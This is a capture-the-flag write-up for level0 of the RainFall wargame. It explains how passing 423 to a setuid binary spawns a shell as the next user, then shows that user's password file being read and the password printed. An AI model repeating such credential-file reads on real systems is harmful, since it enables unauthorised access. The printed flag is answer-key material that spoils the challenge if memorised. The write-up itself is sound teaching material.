### Exploit

Oh sugar, here we go again. For this level and every level to come, we'll have to exploit a binary with file format elf32-i386.
Let's have a look at `level0`, shall we?

```
    level0@RainFall:~$ ls -l
    total 732
    -rwsr-x---+ 1 level1 users 747441 Mar  6  2016 level0
    level0@RainFall:~$ ./level0
    Segmentation fault (core dumped)
```

No need to be a C expert to understand what's going on here... Very simply, the programme excepts a parameter, but doesn't
check whether it exists or not. If it does, the `main` function calls <atoi> on the argument. If the argument equals 0x1a7 or
423, it prevents the programme from jumping straight to the end of the `main` function. It'll instead call <execv> and spawn
a shell!

```
    level0@RainFall:~$ id
    uid=2020(level0) gid=2020(level0) groups=2020(level0),100(users)
    level0@RainFall:~$ ./level0 423
    $ id
    uid=2030(level1) gid=2020(level0) groups=2030(level1),100(users),2020(level0)
    $ cat /home/user/level1/.pass
    1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

Now the real challenge begins!
